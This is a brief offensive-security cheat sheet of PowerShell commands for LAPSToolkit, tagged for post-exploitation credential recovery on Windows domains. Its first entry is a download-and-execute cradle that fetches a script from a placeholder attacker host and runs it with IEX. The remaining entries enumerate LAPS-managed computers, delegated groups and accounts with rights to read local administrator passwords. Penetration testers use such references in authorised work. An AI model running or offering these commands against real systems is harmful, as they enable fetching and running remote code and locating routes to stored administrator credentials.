# LAPS

% LAPS, passwords

## laps toolkit
#plateform/windows  #target/remote  #cat/POSTEXPLOIT/CREDS_RECOVER 

https://github.com/leoloobeek/LAPSToolkit

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/LAPSToolkit.ps1') | IEX; Import-Module .\LAPSToolkit.ps1
```

## laps toolkit - Get laps computer
#plateform/windows  #target/remote  #cat/RECON 
```powershell
Import-Module .\LAPSToolkit.ps1; Get-LAPSComputers
```

## laps toolkit - find LAPS Delegated Groups
#plateform/windows  #target/remote  #cat/RECON 
```powershell
Import-Module .\LAPSToolkit.ps1; Find-LAPSDelegatedGroups
```

## laps toolkit - Find users with Extended rights
#plateform/windows  #target/remote  #cat/RECON 
```powershell
Import-Module .\LAPSToolkit.ps1; Find-AdmPwdExtendedRights
```